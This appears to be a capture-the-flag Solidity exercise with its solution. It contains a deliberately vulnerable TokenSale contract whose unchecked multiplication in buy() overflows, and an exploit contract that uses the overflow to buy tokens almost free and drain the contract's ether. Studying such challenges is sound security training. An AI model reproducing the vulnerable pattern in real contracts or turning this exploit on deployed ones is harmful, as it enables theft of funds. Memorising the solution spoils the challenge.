// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract TokenSale {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to deploy contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable returns (uint256) {
        uint256 total = 0;
        unchecked {
            total += numTokens * PRICE_PER_TOKEN;
        }
        require(msg.value == total);

        balanceOf[msg.sender] += numTokens;
        return (total);
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        (bool ok,) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
        require(ok, "Transfer to msg.sender failed");
    }
}

// Write your exploit contract below
contract ExploitContract {
    TokenSale public tokenSale;

    constructor(TokenSale _tokenSale) payable {
        tokenSale = _tokenSale;
    }

    function exploit() public {
        uint256 numTokens = 115792089237316195423570985008687907853269984665640564039458;
        uint256 ethValue;
        // Put your solution here
        unchecked {
            ethValue = numTokens * 1e18; // overflow
        }
        tokenSale.buy{value: ethValue}(numTokens);

        uint256 balance = address(tokenSale).balance;
        uint256 numTokensToSell = balance / 1e18;
        tokenSale.sell(numTokensToSell);
    }

    receive() external payable {}
    // write your exploit functions below
}
